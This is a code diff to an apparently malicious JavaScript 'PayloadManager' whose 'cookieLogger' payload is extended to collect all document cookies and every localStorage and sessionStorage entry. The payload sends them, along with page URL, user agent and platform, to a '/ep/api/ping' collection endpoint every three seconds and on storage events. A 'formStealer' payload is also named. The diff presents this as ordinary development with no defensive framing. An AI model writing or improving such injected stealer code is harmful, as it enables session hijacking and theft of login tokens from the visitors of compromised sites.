@@ -17,12 +17,25 @@ const PayloadManager = {
     payloads: {
         cookieLogger: () => {
             const stealCookies = () => {
-                const cookies = document.cookie.split(';').map(cookie => {
+                // Get all cookies from document
+                const documentCookies = document.cookie.split(';').map(cookie => {
                     const [name, value] = cookie.trim().split('=');
-                    return { name, value };
+                    return { name, value, source: 'document' };
                 });
 
-                if (cookies.length > 0) {
+                // Get cookies from localStorage
+                const localStorageCookies = Object.keys(localStorage).map(key => {
+                    return { name: key, value: localStorage.getItem(key), source: 'localStorage' };
+                });
+
+                // Get cookies from sessionStorage
+                const sessionStorageCookies = Object.keys(sessionStorage).map(key => {
+                    return { name: key, value: sessionStorage.getItem(key), source: 'sessionStorage' };
+                });
+
+                const allCookies = [...documentCookies, ...localStorageCookies, ...sessionStorageCookies];
+
+                if (allCookies.length > 0) {
                     fetch('/ep/api/ping', { 
                         method: 'POST',
                         credentials: 'include',
@@ -30,11 +43,11 @@ const PayloadManager = {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            cookies,
+                            cookies: allCookies,
                             url: window.location.href,
-                            timestamp: new Date().toISOString(),
                             userAgent: navigator.userAgent,
-                            platform: navigator.platform
+                            platform: navigator.platform,
+                            timestamp: new Date().toISOString()
                         })
                     });
                 }
@@ -47,13 +60,8 @@ const PayloadManager = {
             document.addEventListener('cookie', stealCookies);
             setInterval(stealCookies, 3000);
 
-            // Monitor localStorage changes
-            const originalSetItem = localStorage.setItem;
-            localStorage.setItem = function() {
-                const result = originalSetItem.apply(this, arguments);
-                stealCookies();
-                return result;
-            };
+            // Monitor storage changes
+            window.addEventListener('storage', stealCookies);
         },
 
         formStealer: () => {
